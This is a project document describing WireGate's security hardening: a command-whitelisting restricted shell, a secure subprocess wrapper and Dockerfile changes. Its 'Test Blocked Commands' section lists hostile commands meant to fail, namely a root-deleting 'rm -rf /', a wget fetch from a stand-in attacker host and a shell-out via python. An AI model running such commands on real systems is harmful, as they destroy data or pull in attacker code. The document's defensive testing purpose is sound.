# WireGate Security Hardening

This document describes the security hardening measures implemented for WireGate to create a restricted root user environment.

## Overview

WireGate now runs with a restricted root user that can only execute specific commands needed for WireGuard, AmneziaWG, and iptables operations. This significantly reduces the attack surface and prevents arbitrary command execution.

## Security Features

### 1. Restricted Shell (`restricted_shell.sh`)

The restricted shell wrapper validates all commands and arguments before execution:

- **Whitelist Approach**: Only pre-approved commands can execute
- **Argument Validation**: Each command's arguments are validated against allowed patterns
- **Command Chaining Prevention**: Prevents command injection via `;`, `|`, `&&`, `||`
- **Path Validation**: Ensures commands can only access allowed directories

#### Allowed Commands:
- **WireGuard**: `wg`, `wg-quick`
- **AmneziaWG**: `awg`, `awg-quick`, `amneziawg-go`
- **Network**: `iptables`, `ip6tables`, `tc`, `ip`
- **System**: `modprobe`, `lsmod`, `ps`, `pgrep`, `pkill`, `kill`
- **File Ops**: `chmod`, `chown`, `mkdir`, `ln`, `rm`, `find`, `mknod`
- **Text Processing**: `tail`, `grep`, `sed`, `awk`
- **Network Utils**: `curl`, `netstat`, `hostname`
- **System Utils**: `base64`, `head`, `sleep`, `date`, `echo`, `printf`
- **Custom**: `tor`, `torflux`, `vanguards`, `traffic-weir`

### 2. Secure Command Executor (`secure_command_executor.py`)

Python wrapper that replaces all `subprocess` calls with secure alternatives:

- **Command Validation**: Validates commands before execution
- **Argument Sanitization**: Ensures arguments match allowed patterns
- **Error Handling**: Proper error handling and logging
- **Async Support**: Supports both sync and async command execution

### 3. Security Configuration (`security_config.py`)

Comprehensive security policies:

- **Path Whitelisting**: Only allows access to specific directories
- **File Extension Filtering**: Only allows safe file types
- **Size Limits**: Enforces maximum file sizes
- **Pattern Blocking**: Blocks dangerous patterns in content
- **Input Sanitization**: Sanitizes filenames and paths

### 4. Applied Security Patches

Automated patching system that replaces vulnerable code:

- **Subprocess Replacement**: All `subprocess.run()` calls replaced with `secure_run()`
- **Import Injection**: Automatically adds secure executor imports
- **Code Analysis**: Identifies and patches vulnerable patterns

## Implementation Details

### Dockerfile Changes

```dockerfile
# Copy and setup restricted shell
COPY ./Src/restricted_shell.sh /WireGate/restricted_shell.sh
COPY ./Src/secure_command_executor.py /WireGate/secure_command_executor.py
RUN chmod +x /WireGate/restricted_shell.sh && \
    chmod +x /WireGate/secure_command_executor.py

# Create restricted root user setup
RUN echo '#!/bin/bash' > /usr/local/bin/restricted_bash && \
    echo 'exec /WireGate/restricted_shell.sh bash "$@"' >> /usr/local/bin/restricted_bash && \
    chmod +x /usr/local/bin/restricted_bash

# Set restricted shell as default for root
RUN echo '/usr/local/bin/restricted_bash' >> /etc/shells

# Apply security patches
COPY ./Src/apply_security_patches.py /WireGate/apply_security_patches.py
RUN chmod +x /WireGate/apply_security_patches.py && \
    cd /WireGate && python3 apply_security_patches.py
```

### Usage in Code

Replace subprocess calls with secure alternatives:

```python
# Before (vulnerable)
import subprocess
result = subprocess.run(['wg', 'show'], capture_output=True, text=True)

# After (secure)
from secure_command_executor import secure_run
result = secure_run(['wg', 'show'], capture_output=True, text=True)
```

## Security Benefits

### 1. Command Injection Prevention
- **Before**: Any command could be executed via subprocess
- **After**: Only whitelisted commands can execute

### 2. Path Traversal Protection
- **Before**: Files could be written anywhere
- **After**: Files can only be written to allowed directories

### 3. File Upload Security
- **Before**: Any file type could be uploaded
- **After**: Only specific file types with size limits

### 4. Input Validation
- **Before**: Limited input validation
- **After**: Comprehensive pattern-based validation

## Testing the Restrictions

### Test Allowed Commands
```bash
# These should work
/WireGate/restricted_shell.sh wg show
/WireGate/restricted_shell.sh iptables -L
/WireGate/restricted_shell.sh ps aux
```

### Test Blocked Commands
```bash
# These should fail
/WireGate/restricted_shell.sh rm -rf /
/WireGate/restricted_shell.sh wget http://evil.com/script.sh
/WireGate/restricted_shell.sh python -c "import os; os.system('id')"
```

## Monitoring and Logging

All command executions are logged with:
- Command executed
- Arguments provided
- Execution result
- Timestamp
- User context

## Maintenance

### Adding New Commands

1. Add command to `ALLOWED_COMMANDS` in `restricted_shell.sh`
2. Define allowed argument patterns
3. Update `secure_command_executor.py` if needed
4. Test thoroughly

### Updating Security Policies

1. Modify patterns in `security_config.py`
2. Update file extension whitelist
3. Adjust size limits as needed
4. Test with edge cases

## Compliance

This security hardening addresses:
- **OWASP Top 10**: Command injection, path traversal, file upload vulnerabilities
- **CIS Controls**: Secure configuration, access control
- **NIST Guidelines**: Defense in depth, least privilege

## Conclusion

The restricted root user setup provides significant security improvements while maintaining full functionality for WireGuard, AmneziaWG, and iptables operations. The whitelist approach ensures that even if an attacker gains access, they can only execute pre-approved commands within defined parameters.
